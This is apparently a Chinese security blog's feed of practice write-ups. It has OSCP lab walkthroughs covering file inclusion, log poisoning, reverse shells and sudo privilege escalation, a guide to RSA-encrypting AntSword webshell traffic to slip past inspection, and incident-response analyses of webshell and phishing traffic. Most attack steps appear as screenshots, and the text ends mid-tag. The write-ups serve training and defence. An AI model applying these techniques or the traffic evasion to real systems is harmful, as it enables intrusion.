        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Ha-natraj"><a href="#【OSCP系列】OSCP靶机—Ha-natraj" class="headerlink" title="【OSCP系列】OSCP靶机—Ha-natraj"></a>【OSCP系列】OSCP靶机—Ha-natraj</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Ha-natraj/image-20240630145606754.png" alt="image-20240630145606754"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145644330.png" alt="image-20240630145644330"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145713927.png" alt="image-20240630145713927"></p><p><img src="/img/OSCP-Ha-natraj/image-20240630145929111.png" alt="image-20240630145929111"></p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145940567.png" alt="image-20240630145940567"></p><p>正常的ssh服务和http服务，是Ubuntu系统</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630150326003.png" alt="image-20240630150326003"></p><p>发现了<code>console</code>和<code>images</code>目录</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>先对首页展开调查</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150231216.png" alt="image-20240630150231216"></p><p>大致都是对这位<code>Nataraj</code>的印度神进行了讲述，并无有价值的东西</p><p>看下nmap扫描出来的<code>console</code>目录，这个目录的名字我们还是很感兴趣的</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150457085.png" alt="image-20240630150457085"></p><p>噢，有个<code>file.php</code>，是个很好的点</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150525571.png" alt="image-20240630150525571"></p><p>一片空白？我们FUZZ试试</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153904848.png" alt="image-20240630153904848"></p><p>有<code>file</code>参数，成功挖掘到一个漏洞</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153948936.png" alt="image-20240630153948936"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>在上面的<code>/etc/passwd</code>文件中发现两个用户名</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154056230.png" alt="image-20240630154056230"></p><p>PHP伪协议读取这个<code>file.php</code>文件内容</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154321835.png" alt="image-20240630154321835"></p><p>目前只有一个任意文件包含漏洞；能想到的有日志文件包含</p><p>本想包含一下apache 的日志，但是是个空白</p><p><img src="/img/OSCP-Ha-natraj/image-20240630155240403.png" alt="image-20240630155240403"></p><p>转去包含其他日志去；Ubuntu 的登陆日志在<code>/var/log/auth.log</code></p><p><img src="/img/OSCP-Ha-natraj/image-20240630155356137.png" alt="image-20240630155356137"></p><p>OK，有登录日志；那利用ssh登陆，写入webshell；这里用了很多方法，均未成功，最终使用如下方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630163039088.png" alt="image-20240630163039088"></p><p>连接成功（如果失败，可以重置靶场环境多尝试）</p><p><img src="/img/OSCP-Ha-natraj/image-20240630164930178.png" alt="image-20240630164930178"></p><p>将shell反弹到nc上</p><p><img src="/img/OSCP-Ha-natraj/image-20240630165307264.png" alt="image-20240630165307264"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至mahakal"><a href="#1、提权至mahakal" class="headerlink" title="1、提权至mahakal"></a>1、提权至mahakal</h3><p>看到apache可以sudo 开启暂停，之后查找apache相关可操作的关键性文件</p><p><img src="/img/OSCP-Ha-natraj/image-20240630175107120.png" alt="image-20240630175107120"></p><p>通过修改apache的运行用户，达到提权，但是这里需要简单说明一下</p><blockquote><p>这里不能修改成root，apache默认不允许root启动，如果要root启动，需要添加“-DBIG_SECURITY_HOLE”到CFLAGS环境变量中重新编译</p></blockquote><p>因此，只能选择root之外的普通用户；记得把前面的注释掉</p><p><img src="/img/OSCP-Ha-natraj/image-20240630180950251.png" alt="image-20240630180950251"></p><p>保存配置文件，重启服务器，然后重新连接shell，拿到<code>mahakal</code>用户的权限（注意多等待会，apache重启需要时间）</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181618663.png" alt="image-20240630181618663"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>之后反弹shell，查看sudo</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181739763.png" alt="image-20240630181739763"></p><p>nmap的sudo提权方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181828812.png" alt="image-20240630181828812">查看nmap 的版本</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181939177.png" alt="image-20240630181939177"></p><p>高于5.21，只能用第一种方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630182126028.png" alt="image-20240630182126028"></p><p>提取成功</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-driftingblues7_vh</title>
      <link href="/2024/06/28/OSCP-driftingblues7-vh/"/>
      <url>/2024/06/28/OSCP-driftingblues7-vh/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—driftingblues7-vh"><a href="#【OSCP系列】OSCP靶机—driftingblues7-vh" class="headerlink" title="【OSCP系列】OSCP靶机—driftingblues7_vh"></a>【OSCP系列】OSCP靶机—driftingblues7_vh</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211809756.png" alt="image-20240628211809756"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211852272.png" alt="image-20240628211852272"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212125320.png" alt="image-20240628212125320"></p><h3 id="3、版本系统探测"><a href="#3、版本系统探测" class="headerlink" title="3、版本系统探测"></a>3、版本系统探测</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212534300.png" alt="image-20240628212534300"></p><p>66端口是个python开放的http服务，80端口是http服务，但是重定向到了443的https服务，443是https服务，2403开放了一个端口，<code>taskmaster2000?</code>是一个未知的服务，3306是mysql服务，8086也是一个http服务</p><h3 id="4、端口漏洞探测"><a href="#4、端口漏洞探测" class="headerlink" title="4、端口漏洞探测"></a>4、端口漏洞探测</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212544334.png" alt="image-20240628212544334"></p><p>在443发现了一个可能的csrf漏洞</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、66端口信息收集"><a href="#1、66端口信息收集" class="headerlink" title="1、66端口信息收集"></a>1、66端口信息收集</h3><p>先对66端口的http服务下刀</p><p>看一下源代码</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221237089.png" alt="image-20240628221237089"></p><p>由本地的js文件，看这个<code>index_files/</code>目录，存在目录穿越</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221254258.png" alt="image-20240628221254258"></p><p>对66端口扫一下</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221157433.png" alt="image-20240628221157433"></p><p>啊嘞，<code>.bash_history</code>文件，这是某个用户的家目录吗？</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221528945.png" alt="image-20240628221528945"></p><p>我们对<code>/etc/hosts</code>文件很感兴趣，以及<code>flag.txt</code>文件，这里先记录下来这些文件</p><p>继续看<code>.bash_profile</code>文件，这里对这个文件做简单的介绍</p><blockquote><p>.bash_prfile 文件是用户登陆之后初始化的文件。即当用户登陆之后，会先执行这个文件的内容，很多时候这个文件会被黑客写入反弹命令，从而成为一种权限维持的手段</p></blockquote><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222337276.png" alt="image-20240628222337276"></p><p>这里只是在原先的PATH路径上加上了家目录下的<code>/bin</code>目录，并重新加载PATH</p><p>看之后的<code>.cshrc</code>文件，<code>alias</code>做了一些别名设置</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222636891.png" alt="image-20240628222636891"></p><p>之后看<code>flag.txt</code>文件，没啥用昂</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222609072.png" alt="image-20240628222609072"></p><p>继续完后看，<code>.pki</code>目录啥也没有</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222926970.png" alt="image-20240628222926970"></p><p><code>index_files</code>目录下我们在浏览器看过的，有很多js 文件</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223001531.png" alt="image-20240628223001531"></p><h3 id="2、80、443端口信息收集"><a href="#2、80、443端口信息收集" class="headerlink" title="2、80、443端口信息收集"></a>2、80、443端口信息收集</h3><p>我们打开80端口就跳转到了443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223058805.png" alt="image-20240628223058805"></p><p>展开一个目录扫描，只要200，因为大都302跳转到登陆页面了</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223835494.png" alt="image-20240628223835494"></p><p>看<code>README.md</code>文件内容</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224039258.png" alt="image-20240628224039258"></p><p>这提示不就来了，查了一下<code>EyesOfNetwork</code>的信息</p><blockquote><p>“EyesOfNetwork” 是一个网络监控工具，它可以帮助用户监控网络流量和分析网络行为。这个工具通常用于网络安全领域，以检测潜在的威胁和异常行为。</p></blockquote><p>后面给了版本号<code>5.3</code>，第一时间当然是查一下有无漏洞</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224441375.png" alt="image-20240628224441375"></p><p>对这几个都挺期待的，看最后一个远程代码执行漏洞</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224553130.png" alt="image-20240628224553130"></p><p>py3的，直接执行一下试试</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224644382.png" alt="image-20240628224644382"></p><p>看来是比较成功的，发现了Admin用户的key，并创建了用户名<code>h4ker</code></p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224836055.png" alt="image-20240628224836055"></p><p>这里显示监听一个端口，有点懵昂。查了一下，这个脚本的利用在第三、四行，就是这里</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225617382.png" alt="image-20240628225617382"></p><h2 id="四、获取root权限"><a href="#四、获取root权限" class="headerlink" title="四、获取root权限"></a>四、获取root权限</h2><p>因为上面显示监听在443端口了，所以端口那里使用443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225900433.png" alt="image-20240628225900433"></p><p>what？</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230100328.png" alt="image-20240628230100328"></p><p>不在docker里面</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230125878.png" alt="image-20240628230125878"></p><p>what？这就完事儿了？</p><p>对其他端口展开了一些调查，发现确实获取不了其他信息了</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230540264.png" alt="image-20240628230540264"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—PyExpvm</title>
      <link href="/2024/06/28/OSCP-PyExp/"/>
      <url>/2024/06/28/OSCP-PyExp/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—PyExpvm"><a href="#【OSCP系列】OSCP靶机—PyExpvm" class="headerlink" title="【OSCP系列】OSCP靶机—PyExpvm"></a>【OSCP系列】OSCP靶机—PyExpvm</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-PyExp/image-20240627232247823.png" alt="image-20240627232247823"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-PyExp/image-20240627232324271.png" alt="image-20240627232324271"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-PyExp/image-20240627232553908.png" alt="image-20240627232553908"></p><p><img src="/img/OSCP-PyExp/image-20240627235748090.png" alt="image-20240627235748090"></p><p>只开放了1337、3306端口</p><h3 id="3、针对开放端口做详细探测"><a href="#3、针对开放端口做详细探测" class="headerlink" title="3、针对开放端口做详细探测"></a>3、针对开放端口做详细探测</h3><p><img src="/img/OSCP-PyExp/image-20240628000021819.png" alt="image-20240628000021819"></p><p>1337是ssh服务，3306是mysql数据库服务；推测跑在Linxu服务器上</p><p>这里很奇怪，没有web服务开放，推测应该在mysql中拿信息</p><h3 id="4、针对开放端口做漏洞探测"><a href="#4、针对开放端口做漏洞探测" class="headerlink" title="4、针对开放端口做漏洞探测"></a>4、针对开放端口做漏洞探测</h3><p>虽然这样探测出来的可能性微乎其微，但必要的流程还是走一下</p><p><img src="/img/OSCP-PyExp/image-20240628000437268.png" alt="image-20240628000437268"></p><p>这里给了几个漏洞测试的脚本信息，但是他们的利用都失败了</p><h2 id="三、MySQL数据库信息收集"><a href="#三、MySQL数据库信息收集" class="headerlink" title="三、MySQL数据库信息收集"></a>三、MySQL数据库信息收集</h2><p>mysql无疑是本靶场最重要的一个突破点，先测试一下mysql是否允许外部连接</p><p><img src="/img/OSCP-PyExp/image-20240628000611734.png" alt="image-20240628000611734"></p><p>哦，这里是肯定的，那接下来我们可以尝试爆破</p><p><img src="/img/OSCP-PyExp/image-20240628001215373.png" alt="image-20240628001215373"></p><p><code>rockyou</code>这个字典属实爽快，很快就爆破出来了；接下来登陆数据库查看有无敏感信息</p><p><img src="/img/OSCP-PyExp/image-20240628001407393.png" alt="image-20240628001407393"></p><p>在<code>data</code>这个数据库中发现有个hash值</p><p><img src="/img/OSCP-PyExp/image-20240628001440897.png" alt="image-20240628001440897"></p><p>这样看着有点乱，我们分开字段值来查看</p><p><img src="/img/OSCP-PyExp/image-20240628001714076.png" alt="image-20240628001714076"></p><p>大佬勿喷，笔者还是首次碰到这个加密方法，因此查找了一些资料，下面简单对这个加密算法做出一个说明</p><blockquote><p>Fernet 算法是一个安全的加密方法，它使用 AES 作为底层加密算法，并结合 HMAC 来确保数据的完整性。</p><p>其是一种对称加密算法，由Python的cryptography库提供支持。使用Fernet加密算法可以实现简单而又强大的加密功能，通过生成加密密钥加密数据，并使用同一个密钥解密数据。</p></blockquote><p>下面对这个算法进行一个加解密的尝试，参考文章资料：<a href="https://deepinout.com/python/python-qa/84_hk_1709160332.html">Fernet加密算法在Python中的应用|极客笔记 (deepinout.com)</a></p><p>尝试对<code>Hello, world!</code>进行加解密</p><p><img src="/img/OSCP-PyExp/image-20240628003746582.png" alt="image-20240628003746582"></p><p>之后将数据库中拿到的信息进行解密，拿到了字符串：lucy:wJ9&#96;”Lemdv9[FEw-</p><p><img src="/img/OSCP-PyExp/image-20240628004435194.png" alt="image-20240628004435194"></p><p>这个字符串，明眼一看，中间由冒号<code>:</code>分割，怕是个账号密码</p><h2 id="四、SSH登陆Getshell"><a href="#四、SSH登陆Getshell" class="headerlink" title="四、SSH登陆Getshell"></a>四、SSH登陆Getshell</h2><p>也是非常的流畅，拿到了shell</p><p><img src="/img/OSCP-PyExp/image-20240628004715374.png" alt="image-20240628004715374"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>本有有用户密码的情况下，查看是否有sudo滥用的情况，果真有</p><p><img src="/img/OSCP-PyExp/image-20240628005404504.png" alt="image-20240628005404504"></p><p>这里的exec函数，将会执行任何的py代码；找一段py 的反弹shell</p><p><img src="/img/OSCP-PyExp/image-20240628010553340.png" alt="image-20240628010553340"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【流量加密】AntSword流量RSA加密</title>
      <link href="/2024/06/26/Red-Team-Invasion-AntSword-encryption/"/>
      <url>/2024/06/26/Red-Team-Invasion-AntSword-encryption/</url>
      
        <content type="html"><![CDATA[<h1 id="【流量加密】AntSword流量RSA加密"><a href="#【流量加密】AntSword流量RSA加密" class="headerlink" title="【流量加密】AntSword流量RSA加密"></a>【流量加密】AntSword流量RSA加密</h1><h2 id="一、新建编码器"><a href="#一、新建编码器" class="headerlink" title="一、新建编码器"></a>一、新建编码器</h2><p>在蚁剑的【编码管理】中，新建一个编码器，选择【PHP RSA】，名称随意</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114312428.png" alt="image-20240626114312428"></p><p>在【RSA配置】中点击【生成】将重新配置公私钥</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114435135.png" alt="image-20240626114435135"></p><p>复制最下面的PHP代码到靶机</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114515471.png" alt="image-20240626114515471"></p><h2 id="二、测试连接"><a href="#二、测试连接" class="headerlink" title="二、测试连接"></a>二、测试连接</h2><p>测试默认的编码器，连接失败</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114626428.png" alt="image-20240626114626428"></p><p>使用新建的【PHP RSA】编码器</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114852725.png" alt="image-20240626114852725"></p><h2 id="三、查看流量"><a href="#三、查看流量" class="headerlink" title="三、查看流量"></a>三、查看流量</h2><p>我们执行<code>whoami</code>，在靶机上抓取流量</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115032037.png" alt="image-20240626115032037"></p><p>可以看到，请求包已经没有了传统的<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code>与<code>@set_time_limit(0);</code>了</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115307427.png" alt="image-20240626115307427"></p><p>但是响应包依然是明文，这里稍有不足</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AntSword </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章 流量特征分析-蚁剑流量分析</title>
      <link href="/2024/06/15/xuanji-diliuzhang-AntSword/"/>
      <url>/2024/06/15/xuanji-diliuzhang-AntSword/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章-流量特征分析-蚁剑流量分析"><a href="#【玄机应急】第六章-流量特征分析-蚁剑流量分析" class="headerlink" title="【玄机应急】第六章 流量特征分析-蚁剑流量分析"></a>【玄机应急】第六章 流量特征分析-蚁剑流量分析</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载附件，在Wireshark中打开</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133002004.png" alt="image-20240615133002004"></p><h2 id="二、步骤一：木马的连接密码是多少"><a href="#二、步骤一：木马的连接密码是多少" class="headerlink" title="二、步骤一：木马的连接密码是多少"></a>二、步骤一：木马的连接密码是多少</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133039067.png" alt="image-20240615133039067"></p><p>筛选HTTP流量数据，典型的蚁剑流量特征</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133248238.png" alt="image-20240615133248238"></p><p>蚁剑的连接密码也正是开头的1</p><h2 id="三、步骤二：黑客执行的第一个命令是什么"><a href="#三、步骤二：黑客执行的第一个命令是什么" class="headerlink" title="三、步骤二：黑客执行的第一个命令是什么"></a>三、步骤二：黑客执行的第一个命令是什么</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133448780.png" alt="image-20240615133448780"></p><p>看来是需要对蚁剑的流量解密了，之前提到过蚁剑的流量解密</p><p>找到第一条蚁剑的流量，进行解密，记得去掉前两位的<code>AK</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133730539.png" alt="image-20240615133730539"></p><p>解密结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;id;echo e124bc;pwd;echo 43523</span><br></pre></td></tr></table></figure><p>我们追踪http流，查看响应结果，执行的命令是<code>id</code>，这里感觉稍微有点那啥。。</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134031283.png" alt="image-20240615134031283"></p><h2 id="四、步骤三：黑客读取了哪个文件的内容"><a href="#四、步骤三：黑客读取了哪个文件的内容" class="headerlink" title="四、步骤三：黑客读取了哪个文件的内容"></a>四、步骤三：黑客读取了哪个文件的内容</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134131656.png" alt="image-20240615134131656"></p><p>当我们一条一条的解密，或者看响应包会发现，看的是<code>/etc/passwd</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134357804.png" alt="image-20240615134357804"></p><h2 id="五、黑客上传了什么文件到服务器，提交文件名"><a href="#五、黑客上传了什么文件到服务器，提交文件名" class="headerlink" title="五、黑客上传了什么文件到服务器，提交文件名"></a>五、黑客上传了什么文件到服务器，提交文件名</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134435923.png" alt="image-20240615134435923"></p><p>在<code>437</code>号的响应包中出现了当前目录下所有的文件以及需改日期等信息</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615135015460.png" alt="image-20240615135015460"></p><p><code>flag.txt</code>文件的日期是后面修改，说明该文件很可能是黑客上传的</p><h2 id="六、黑客上传的文件内容是什么"><a href="#六、黑客上传的文件内容是什么" class="headerlink" title="六、黑客上传的文件内容是什么"></a>六、黑客上传的文件内容是什么</h2><p>还是锁定黑客上传的的<code>422</code>号请求包</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140207419.png" alt="image-20240615140207419"></p><p>那另一组类似十六进制的值大概就是上传的内容，解密下</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140243694.png" alt="image-20240615140243694"></p><h2 id="七、黑客下载了哪个文件，提交文件绝对路径"><a href="#七、黑客下载了哪个文件，提交文件绝对路径" class="headerlink" title="七、黑客下载了哪个文件，提交文件绝对路径"></a>七、黑客下载了哪个文件，提交文件绝对路径</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140324901.png" alt="image-20240615140324901"></p><p>在最后一条</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140554508.png" alt="image-20240615140554508"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蚁剑流量特征 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第七章 常见攻击事件分析--钓鱼邮件</title>
      <link href="/2024/06/14/xuanji-diqizhang-Phisshing-emails/"/>
      <url>/2024/06/14/xuanji-diqizhang-Phisshing-emails/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第七章-常见攻击事件分析–钓鱼邮件"><a href="#【玄机应急】第七章-常见攻击事件分析–钓鱼邮件" class="headerlink" title="【玄机应急】第七章 常见攻击事件分析–钓鱼邮件"></a>【玄机应急】第七章 常见攻击事件分析–钓鱼邮件</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载好流量数据包附件</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180033847.png" alt="image-20240614180033847"></p><h2 id="二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP"><a href="#二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP" class="headerlink" title="二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP"></a>二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180108297.png" alt="image-20240614180108297"></p><p>先整体浏览下附件内容，有www的网站源文件和log的日志目录</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180851874.png" alt="image-20240614180851874"></p><p>这里有钓鱼的邮件，直接记事本打开。看最后一个<code>Received</code>内部的from的地址</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183540152.png" alt="image-20240614183540152"></p><p>前面的<code>Received</code>内部的from地址大都是其他邮件服务器的代理转发地址</p><h2 id="三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP"><a href="#三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP" class="headerlink" title="三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP"></a>三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183859537.png" alt="image-20240614183859537"></p><h3 id="1、过沙箱"><a href="#1、过沙箱" class="headerlink" title="1、过沙箱"></a>1、过沙箱</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202342907.png" alt="image-20240614202342907"></p><h2 id="四、步骤三：请分析获取webshell的文件名"><a href="#四、步骤三：请分析获取webshell的文件名" class="headerlink" title="四、步骤三：请分析获取webshell的文件名"></a>四、步骤三：请分析获取webshell的文件名</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202532251.png" alt="image-20240614202532251"></p><h3 id="1、D盾扫一下"><a href="#1、D盾扫一下" class="headerlink" title="1、D盾扫一下"></a>1、D盾扫一下</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203046008.png" alt="image-20240614203046008"></p><h2 id="五、步骤四：隧道程序的文件名"><a href="#五、步骤四：隧道程序的文件名" class="headerlink" title="五、步骤四：隧道程序的文件名"></a>五、步骤四：隧道程序的文件名</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203257208.png" alt="image-20240614203257208"></p><p>观察其他路径的文件</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204406110.png" alt="image-20240614204406110"></p><p>疑似mysql 的配置文件<code>my.conf</code>怎么会出现在这里。过沙箱</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204704963.png" alt="image-20240614204704963"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼邮件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章 流量特征分析-蚂蚁爱上树</title>
      <link href="/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/"/>
      <url>/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章-流量特征分析-蚂蚁爱上树"><a href="#【玄机应急】第六章-流量特征分析-蚂蚁爱上树" class="headerlink" title="【玄机应急】第六章 流量特征分析-蚂蚁爱上树"></a>【玄机应急】第六章 流量特征分析-蚂蚁爱上树</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载附件，在Wireshark中打开</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled.png" alt="Untitled"></p><h2 id="二、步骤一：管理员Admin账号的密码是什么？"><a href="#二、步骤一：管理员Admin账号的密码是什么？" class="headerlink" title="二、步骤一：管理员Admin账号的密码是什么？"></a>二、步骤一：管理员Admin账号的密码是什么？</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled1.png" alt="Untitled"></p><h3 id="1、发现蚁剑流量特征"><a href="#1、发现蚁剑流量特征" class="headerlink" title="1、发现蚁剑流量特征"></a>1、发现蚁剑流量特征</h3><p>先大致浏览一下整体的数据包，这两个端口通讯频繁</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled2.png" alt="Untitled"></p><p>找几个流量包来看一看，发现蚁剑流量特征</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled3.png" alt="Untitled"></p><h3 id="2、找管理员的密码"><a href="#2、找管理员的密码" class="headerlink" title="2、找管理员的密码"></a>2、找管理员的密码</h3><p>找木马<code>product2.php</code> ，做标记</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains <span class="string">&quot;/product2.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl a 全选，然后ctrl m 做标记</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled4.png" alt="Untitled"></p><p>之后重新回归http，看木马的响应包</p><p><img 